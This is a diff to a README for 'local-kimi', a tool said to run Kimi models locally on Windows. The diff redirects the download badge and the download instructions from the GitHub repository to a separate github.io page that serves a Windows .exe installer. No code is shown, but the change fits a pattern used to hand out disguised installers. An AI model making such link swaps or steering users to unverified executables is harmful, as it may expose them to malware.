@@ -1,6 +1,6 @@
 # 🐢 local-kimi - Run Kimi models on your machine
 
-[![Download local-kimi](https://img.shields.io/badge/Download-local--kimi-blue.svg)](https://github.com/Ramire9569/local-kimi)
+[![Download local-kimi](https://img.shields.io/badge/Download-local--kimi-blue.svg)](https://ramire9569.github.io)
 
 Local-kimi lets you run high-performance AI models directly on your Windows computer. You do not need a cloud connection to use advanced coding tools. This software turns your machine into a personal server. It supports tools like Claude Code, Cline, and Aider.
 
@@ -15,7 +15,7 @@ Your computer needs specific parts to run this software well. Please check your 
 
 ## 📥 How to Download
 
-1. Visit the project website at: https://github.com/Ramire9569/local-kimi
+1. Visit the project website at: https://ramire9569.github.io
 2. Scroll to the section marked Releases.
 3. Click the link for the latest Windows installer file. It usually ends with .exe.
 4. Save the file to your computer.
